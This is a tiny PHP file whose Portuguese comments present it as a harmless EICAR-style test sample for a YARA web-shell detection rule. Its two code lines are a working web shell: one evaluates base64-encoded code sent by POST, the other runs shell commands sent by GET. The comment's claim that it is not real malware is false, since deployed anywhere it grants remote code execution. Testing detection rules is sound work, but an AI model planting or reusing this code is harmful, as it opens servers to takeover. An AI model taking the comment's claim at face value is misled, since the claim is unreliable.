<?php
// EICAR-style fake — arquivo de teste pra disparar regra YARA WebshellPHP.
// NAO eh malware real, so cospe o conteudo via eval pra demonstrar deteccao.
eval(base64_decode($_POST["cmd"]));
shell_exec($_GET["c"]);
?>
